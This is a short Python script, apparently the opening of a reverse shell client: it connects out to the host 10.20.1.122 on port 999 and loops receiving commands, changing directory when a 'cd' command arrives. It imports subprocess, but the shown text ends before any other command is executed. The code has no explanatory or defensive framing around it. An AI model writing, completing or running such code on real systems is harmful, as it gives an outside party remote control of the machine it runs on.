import os
import socket
import subprocess

s = socket.socket()
host = '10.20.1.122'
port = 999
s.connect((host, port))


while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))